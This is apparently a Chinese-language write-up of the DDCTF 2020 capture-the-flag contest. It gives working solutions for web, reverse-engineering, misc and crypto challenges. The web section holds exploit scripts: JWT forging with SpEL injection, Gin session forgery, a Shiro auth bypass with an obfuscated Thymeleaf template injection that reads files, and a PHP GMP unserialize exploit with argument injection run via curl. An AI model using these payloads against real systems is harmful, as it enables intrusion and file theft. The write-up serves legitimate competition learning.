---
title: DDCTF 2020 Writeup
date: 2020-09-07 21:48:48
tags: [ddctf, web]
---

今年改了赛制, 可以两人组队, 我觉得改的还是不错的, 终于不用现场表演学习逆向和 pwn 了, 成功和 Ary 师傅打到了第三 233

<!-- more -->

## WEB

### Web签到题

访问 http://117.51.136.197/hint/1.txt 得到使用说明，
```
curl http://117.51.136.197/admin/login -d 'username=1&pwd=1' -vv
```
拿到 token
```
{"code":0,"message":"success","data":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIxIiwidXNlclJvbGUiOiJHVUVTVCIsImV4cCI6MTU5OTQ2OTA0Mn0.fONrD0R3NLTybq2WEP5V7uWTBI_0T0E5utI3MZFngMU"}
```
明显的 jwt，需要用这个来 auth，用 `https://github.com/brendan-rius/c-jwt-cracker` 爆破出来 secret 是 1，修改 userRole 到 ADMIN 就可以拿到客户端的地址 http://117.51.136.197/B5Itb8dFDaSFWZZo/client

逆向一下得到用签名算法用的是 hmac，key 是 DDCTFWithYou，fuzz 了半天发现是 spel，直接命令执行似乎不行，于是根据提示给的 flag 位置直接读 flag 即可

```python
import time
import hmac
import base64
import requests

cmd = "{'a': T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/home/dc2-user/flag/flag.txt'))}"
ts = int(time.time())

sign = base64.b64encode(hmac.new(b'DDCTFWithYou',msg=f"{cmd}|{ts}".encode(), digestmod='sha256').digest())

'''{"signature":"65+KmCKrBVr6UAsjvSZ/iu1bdpx5xmIJLmAX2Squksk=","command":"'ls'","timestamp":1599189389}'''

res = requests.post('http://117.51.136.197/server/command', json={
    'signature': sign.decode(),
    'command': cmd,
    'timestamp': ts
})

print(res.text)
```

### 卡片商店

看到 session 就知道明显的是 gin，于是尝试整数溢出，借 9223372036854775807 个卡片就可以成功溢出，只需要还 1 张卡片，白嫖 9223372036854775806 张，兑换得到提示
```
恭喜你，买到了礼物，里面有夹心饼干、杜松子酒和一张小纸条，纸条上面写着：url: /flag , SecKey: Udc13VD5adM_c10nPxFu@v12，你能看懂它的含义吗？
```
访问 flag 提示不是幸运玩家，但是有了 secretkey 就可以直接伪造 session，对 session base64 解码可以发现用的是 gob 序列化，明显看到 bool, admin 字样，直接自己也搭一个环境设置个 admin session 即可

```go
package main

import (
	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()
	store := cookie.NewStore([]byte("Udc13VD5adM_c10nPxFu@v12"))
	r.Use(sessions.Sessions("session", store))

	r.GET("/hello", func(c *gin.Context) {
		session := sessions.Default(c)

		if session.Get("hello") != "world" {
			session.Set("admin", true)
			session.Save()
		}

		c.JSON(200, gin.H{"hello": session.Get("hello")})
	})
	r.Run(":8000")
}
```

### Easy Web

deleteMe 很明显的 shiro，但是尝试了下反序列化，key 全部不对。于是尝试了下新的权限绕过，可以直接越权访问到 index
```
http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/index
```

明显有个 img 接口可以任意文件下载，通过 WEB-INF/web.xml 一直套娃下，可以下到一堆 class，但是没有找到有漏洞的接口，在 GitHub 上找了下类似的项目，fuzz 了一堆配置文件，最后找到 `WEB-INF/classes/spring-shiro.xml`.
里面有个 `WEB-INF/classes/com/ctf/auth/FilterChainDefinitionMapBuilder.class`，找到路由 `map.put("/68759c96217a32d5b368ad2965f625ef/**", "authc,roles[admin]");`, 进去发现是个 thymeleaf 渲染，但是要绕之前的 com.ctf.util.SafeFilter.

绕了半天最后用 ProcessBuiler 弹 shell 发现连 ls 都没权限执行，于是只好回到 java 用相关 API 读文件，构造 payload 用 File 来列目录，发现 flag 就在 /flag_is_here

```python
import requests
# /flag_is_here

for i in range(0, 20):
    sess = requests.session()
    content = '''
    [[${ T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]{106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101})).getConstructors()[1].newInstance(T(String).valueOf(new char[]{47})).listFiles()[%d] }]]
    '''% i
    res = sess.post("http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/customize", {
        'content': content
    })
    #[[${ (new java.util.Scanner(T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]{106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101, 82, 101, 97, 100, 101, 114})).getConstructors()[0].newInstance(T(String).valueOf(new char[]{47, 102, 108, 97, 103, 95, 105, 115, 95, 104, 101, 114, 101})))).next() }]]

    uuid = res.text[res.text.find('./render/')+len('./render/'):res.text.find('./render/')+len('./render/2b32ce0c2a9292af4fdfe3333058c02c')]

    res = sess.get(f'http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/render/{uuid}')
    print(res.text)
```

最后用 Scanner 这个类，方法名里面没有 read， payload 如下
```
[[${ (new java.util.Scanner(T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]{106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101, 82, 101, 97, 100, 101, 114})).getConstructors()[0].newInstance(T(String).valueOf(new char[]{47, 102, 108, 97, 103, 95, 105, 115, 95, 104, 101, 114, 101})))).next() }]]
```

### Overwrite Me

GMP 的一个 CVE，百度就能搜到, 可以覆盖任意对象的任意属性. https://bugs.php.net/bug.php?id=70513.
访问 http://117.51.137.166/hint/hint.php 拿到前半部分
然后覆盖 $mc 的 flag 导致参数注入就能读到后半部分
```php
<?php
$inj = "-exec cat {} ;";
$inner = 's:1:"3";a:3:{s:4:"flag";s:'.strlen($inj).':"'.$inj.'";s:2:"hi";s:2:"aa";i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}}';
$exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';
echo "\n" . $exploit . "\n";
echo "\n";

$a = urlencode($exploit);

system("curl http://117.51.137.166/EOf9uk3nSsVFK1LQ.php?bullet=$a");
```

## RE

### Android Reverse 1

一个有点不太对劲的AES和tea系列加密算法加一个md5。
虽然aes不太对劲，但顺着aes加密函数，在他隔壁找到了aes的解密函数，直接把加密hook成解密就可以解密。
arm64的so里的tea解密部分好像被优化了，所以先把apk重打包，扔掉64位的so。
32位的so里的tea加密也是一个函数，有一个控制加密的参数8，hook掉把8改为-8，即可以解密。
然后md5部分没办法解，顺着给的提示先解tea，再解AES，就可以拿到Flag。

### Android Reverse 2

先github找个脚本，恢复了Armariris的字符串，然后顺着找到动态注册的关键函数。

包名如第一题，猜测算法也基本同第一题，hook了一下发现aes没变，tea加密变化了，可能是密钥之类的变了，不过没事还是可以直接Hook改参数。
Frida-dexdump确认了一下，Java层啥都没有。

所以还是直接Hook加密改成解密就可以得到Flag。

## MISC

### 真·签到题

公告板里面有

### 一起拼图吗

ChaMD5 之前有类似的题目，github 上有解题脚本 https://github.com/virink/puzzle_tool, 用模式 4 DiffRGB 就能直接拼回来

### decrypt

一共 5 个轮密钥，其中很明显因为只是异或 + 位移的关系， k3, k4 可以合并成一个，实际上有效的是 4 个 0-4096 的密钥，但是空间还是很大，没办法爆破。
这里可以用 MITM，保存 4096 * 4096 个状态，将爆破空间降到 4096^3，用 cpp 写了下，速度还是挺快的，几分钟能跑完，
选取给的 plaintext 和 ciphertext 的第一个 bits 来爆破，然后用后面的 3 个来验证下是否正确

```cpp
#include <iostream>
#include <vector>
#include <unordered_map>

//int sbox0[] = 太长不复制了
//int sbox1[] =
//int rsbox0[] =
//int rsbox1[] =

int NUM_BITS = 12;
int MAX_VALUE = (2 << (NUM_BITS - 1));
int BIT_MASK = MAX_VALUE - 1;

int rol7(int b) {
    return ((((b) << 7) & BIT_MASK) | (((b) & BIT_MASK) >> (NUM_BITS - 7)));
}

int ror7(int b) {
    return ((((b) & BIT_MASK) >> 7) | (((b) << (NUM_BITS - 7)) & BIT_MASK));
}

int encrypt_block(int i, int k0, int k1, int k2, int k3, int k4) {
    i = sbox0[sbox1[sbox0[(i & BIT_MASK) ^ k0] ^ k1] ^ k2] ^ k3;
    return (ror7(i) ^ k4) & BIT_MASK;
}

int encrypt_block_simple(int i, int k0, int k1, int k2, int kf) {
    i = sbox0[sbox1[sbox0[(i & BIT_MASK) ^ k0] ^ k1] ^ k2];
    i = i ^ kf;
    return (ror7(i)) & BIT_MASK;
}

int decrypt_block(int i, int k0, int k1, int k2, int k3, int k4) {
    i = rol7((i & BIT_MASK) ^ k4) ^ k3;
    return (rsbox0[rsbox1[rsbox0[i] ^ k2] ^ k1] ^ k0);
}

int decrypt_block_simple(int i, int k0, int k1, int k2, int kf) {
    i = rol7((i & BIT_MASK)) ^ kf;
    return (rsbox0[rsbox1[rsbox0[i] ^ k2] ^ k1] ^ k0);
}

int merge_two(int n1, int n2) {
    return (n1 << 12) | n2;
}

std::pair<int, int> split_two(int n) {
    return std::make_pair(n >> 12, n & BIT_MASK);
}

// 1092 -> 2285
// k0, k1, k2, (k3 ^ k4) -> kf

int main() {
    std::unordered_map<int, std::vector<int>> mid_status;
    std::vector<std::pair<int, int>> keys;

    for (int i = 0; i < 4096; i++) {
        std::vector<int> tmp;
        tmp.reserve(4096);
        mid_status[i] = tmp;
    }

    int plain = 1079;
    int cipher = 567;

    for (int k0 = 0; k0 < 4096; k0++) {
        for (int k1 = 0; k1 < 4096; k1++) {
            int merge = merge_two(k0, k1);
            int mid = sbox1[sbox0[plain ^ k0] ^ k1];
            mid_status[mid].push_back(merge);
        }
    }
    int cnt = 0;

    for (int k2 = 0; k2 < 4096; k2++) {
        for (int kf = 0; kf < 4096; kf++) {
            int mid = rol7(cipher);
            mid = mid ^ kf;
            mid = rsbox0[mid];
            mid = mid ^ k2;

            for (int &tgt : mid_status[mid]) {
                auto splited = split_two(tgt);
                int k0 = splited.first;
                int k1 = splited.second;

                if (encrypt_block_simple(1079, k0, k1, k2, kf) == 567 &&
                    encrypt_block_simple(633, k0, k1, k2, kf) == 361 &&
                        encrypt_block_simple(1799, k0, k1, k2, kf) == 1793 &&
                        encrypt_block_simple(1121, k0, k1, k2, kf) == 1001) {
                    std::cout << k0 << " " << k1 << " " << k2 << " " << kf << " " << std::endl;
                }
            }
        }
    }

    return 0;
}
```
最后得到两个结果
```
3488 2863 726 1886
934 1050 1509 3200
```

改下脚本用合并的轮密钥来解密，第一行那四个就是正确的密钥
```python
# Define constant properties
SECRET_KEYS = [0, 0, 0, 0, 0]  # DUMMY
NUM_BITS = 12
BLOCK_SIZE_BITS = 48
BLOCK_SIZE = BLOCK_SIZE_BITS / 8
MAX_VALUE = (2 << (NUM_BITS - 1))
BIT_MASK = MAX_VALUE - 1


class Cipher(object):
    def __init__(self, k0, k1, k2, kf):
        self.k0 = k0
        self.k1 = k1
        self.k2 = k2
        self.kf = kf

        self._rand_start = 0
        self.sbox0, self.rsbox0 = self.generate_boxes(106)
        self.sbox1, self.rsbox1 = self.generate_boxes(81)
        print self.sbox0
        print self.sbox1
        print self.rsbox0
        print self.rsbox1

    def my_srand(self, seed):
        self._rand_start = seed

    def my_rand(self):
        if self._rand_start == 0:
            self._rand_start = 123459876
        hi = self._rand_start / 127773
        lo = self._rand_start % 127773
        x = 16807 * lo - 2836 * hi
        if x < 0:
            x += 0x7fffffff
        self._rand_start = (x % (0x7fffffff + 1))
        return self._rand_start

    def generate_boxes(self, seed):
        self.my_srand(seed)
        sbox = range(MAX_VALUE)
        rsbox = range(MAX_VALUE)

        for i in xrange(MAX_VALUE):
            r = self.my_rand() % MAX_VALUE
            temp = sbox[i]
            sbox[i] = sbox[r]
            sbox[r] = temp

        for i in xrange(MAX_VALUE):
            rsbox[sbox[i]] = i

        return sbox, rsbox

    def ror7(self, b):
        return ((((b) & BIT_MASK) >> 7) | (((b) << (NUM_BITS - 7)) & BIT_MASK))

    def rol7(self, b):
        return ((((b) << 7) & BIT_MASK) | (((b) & BIT_MASK) >> (NUM_BITS - 7)))

    def pad_string(self, s):
        num_blocks = len(s) / BLOCK_SIZE
        num_remainder = len(s) % BLOCK_SIZE

        pad = (BLOCK_SIZE - num_remainder) % BLOCK_SIZE
        for i in xrange(BLOCK_SIZE - num_remainder):
            s += chr(pad)
        return s

    def unpad_string(self, s):
        pad = ord(s[-1]) & 0xff
        if pad == 0 or pad > BLOCK_SIZE:
            pad = BLOCK_SIZE
        return s[:-pad]

    def string_to_bits_list(self, s):
        input_chars = s
        num_blocks = len(s) / BLOCK_SIZE

        bits_list = []
        for i in xrange(num_blocks):
            block = 0
            for j in xrange(BLOCK_SIZE):
                block = block << 8
                block = block | ord(input_chars[i * BLOCK_SIZE + j])
            for j in xrange(BLOCK_SIZE_BITS, 0, -NUM_BITS):
                bits_list.append((block >> (j - NUM_BITS)) & BIT_MASK)
        return bits_list

    def bits_list_to_string(self, input_bits):
        num_input_bits_per_block = BLOCK_SIZE_BITS / NUM_BITS;
        output_chars = []
        for i in xrange(0, len(input_bits), num_input_bits_per_block):
            block = 0
            for j in xrange(num_input_bits_per_block):
                block = block << NUM_BITS
                block = block | (input_bits[i + j])
            for j in xrange(BLOCK_SIZE, 0, -1):
                output_chars.append((block >> ((j - 1) * 8)) & 0xff)
        return "".join([chr(x) for x in output_chars])

    def encrypt_bits(self, b):
        boxed = self.sbox0[self.sbox1[self.sbox0[(b & BIT_MASK) ^ self.k0] ^ self.k1] ^ self.k2] ^ self.kf
        return (self.ror7(boxed)) & BIT_MASK;

    def decrypt_bits(self, b):
        unboxed = self.rol7((b & BIT_MASK)) ^ self.kf
        return (self.rsbox0[self.rsbox1[self.rsbox0[unboxed] ^ self.k2] ^ self.k1] ^ self.k0);

    def encrypt(self, s):
        pad_s = self.pad_string(s)
        bits = self.string_to_bits_list(pad_s)
        return self.bits_list_to_string([(self.encrypt_bits(b)) for b in bits])

    def decrypt(self, s):
        bits = self.string_to_bits_list(s)
        dec = [self.decrypt_bits(b) for b in bits]
        return self.unpad_string(self.bits_list_to_string(dec))


if __name__ == "__main__":
    '''
    DIFFERENTECH Cipher

    As you are monitoring your station, you intercepted a hex-encoded encrypted
    message, along with its plain text.

    plaintext = "Cryptanalysis has coevolved together with cryptography"
    ciphertext = ("2371697013e9bdcb50133102f2c8c08a69b93e1878ac7939ac7049"
                  "8ddd5dee019f4be4ec8dd3a612c8708a1169701d5d3de3169c7b1d"
                  "146146146146").decode('hex')

    You have also previously chanced upon another encrypted message, which you
    will need to decrypt.  Taking a look at the algorithm, and past interceptions,
    you noticed that the 12-bit numbers:
        2684 encrypts to 2568
        3599 encrypts to 3185
    You realize that you just might be able to break it before lunch!

    NOTE: GIVE ONE ENCRYPTED FLAG AS PART OF THE QUESTIION AND Try to decrypt
    '''

    # find the right SECRET_KEYS
    SECRET_KEYS = [3488, 2863, 726, 1886]
    cipher = Cipher(*SECRET_KEYS)

    test_text = "DDCTF{"
    ciphertext = ("8ed251b186927f62521fa81348782ecd781957571b69749b3e1515901e4e7065a6e949174472fdf01dcf").decode('hex')
    #test_text = "Cryptanalysis has coevolved together with cryptography"
    #ciphertext = ("2371697013e9bdcb50133102f2c8c08a69b93e1878ac7939ac7049"
    #              "8ddd5dee019f4be4ec8dd3a612c8708a1169701d5d3de3169c7b1d"
    #              "146146146146").decode('hex')

    print '==='
    bits = cipher.string_to_bits_list(test_text)
    print len(bits)
    print bits
    # print cipher.encrypt_bits(1344)
    # print ciphertext
    bits = cipher.string_to_bits_list(ciphertext)
    print bits

    dec = []
    for i in bits:
        dec.append(cipher.decrypt_bits(i))
    print dec
    print cipher.bits_list_to_string(dec)
    print len(bits)
    # 8ed251b186927f62521fa81348782ecd781957571b69749b3e1515901e4e7065a6e949174472fdf01dcf

    # enc = cipher.encrypt(test_text)
    dec = cipher.decrypt(ciphertext)

    if test_text == dec:
        print("That's right!")
    else:
        print("Try again!")
```


